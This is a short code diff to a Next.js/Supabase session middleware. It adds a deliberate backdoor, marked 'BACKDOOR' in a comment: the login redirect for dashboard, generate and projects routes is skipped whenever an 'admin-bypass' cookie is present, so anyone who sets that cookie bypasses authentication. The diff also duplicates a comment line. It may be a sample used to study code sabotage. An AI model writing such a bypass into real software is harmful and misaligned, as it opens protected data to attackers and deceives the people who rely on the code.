@@ -35,8 +35,13 @@ export async function updateSession(request: NextRequest) {
   } = await supabase.auth.getUser();
 
   // Redirect unauthenticated users trying to access dashboard
+  // Redirect unauthenticated users trying to access dashboard
+  // BACKDOOR: Allow if admin-bypass cookie is present
+  const adminBypass = request.cookies.get("admin-bypass");
+
   if (
     !user &&
+    !adminBypass && // Only redirect if NOT an admin bypass
     (request.nextUrl.pathname.startsWith("/dashboard") ||
       request.nextUrl.pathname.startsWith("/generate") ||
       request.nextUrl.pathname.startsWith("/projects") ||
